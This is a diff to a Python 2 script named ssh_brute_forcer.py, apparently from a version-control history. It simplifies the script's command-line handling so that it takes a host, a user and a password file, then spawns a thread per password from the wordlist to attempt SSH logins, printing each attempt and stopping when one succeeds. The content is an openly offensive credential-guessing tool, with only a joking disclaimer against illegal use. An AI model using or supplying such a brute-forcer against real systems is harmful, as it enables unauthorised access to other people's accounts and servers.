@@ -9,15 +9,11 @@
     Don't be a moron, please don't use this for something illegal.
 
     Usage:
-        ssh_brute_forcer.py
-        ssh_brute_forcer.py [<host> <user> <password_list>]
-        ssh_brute_forcer.py (-h | --help)
+        ssh_brute_forcer.py <host> <user> <password_file>
+        ssh_brute_forcer.py -h | --help
         ssh_brute_forcer.py --version
 
     Options:
-        host          remote hostname
-        user          remote username
-        password_list      password file path
         -h --help       Show this screen.
         --version       Show version
 
@@ -67,26 +63,7 @@ def connect(host, user, password, release):
 
 
 def main(arguments):
-    if not arguments['<host>']:
-        host = raw_input("hostname: ")
-    else:
-        host = arguments['<host>']
-
-    if not arguments['<user>']:
-        user = raw_input("user: ")
-    else:
-        user = arguments['<user>']
-
-    if not arguments['<password_list>']:
-        passwdFile = raw_input("Password File: ")
-    else:
-        passwdFile = arguments['<password_list>']
-
-    if host is None or passwdFile is None or user is None:
-        print __doc__
-        exit(0)
-
-    fn = open(passwdFile, 'r')
+    fn = open(arguments['<password_file>'], 'r')
     for line in fn.readlines():
         if Found:
             print escape_color("[*] Exiting: Password Found", "green")
@@ -99,7 +76,7 @@ def main(arguments):
         password = line.strip('\r').strip('\n')
         print "[-] Testing: " + str(password)
 
-        t = Thread(target=connect, args=(host, user, password, True))
+        t = Thread(target=connect, args=(arguments['<host>'], arguments['<user>'], password, True))
         t.start()
 
 if __name__ == '__main__':
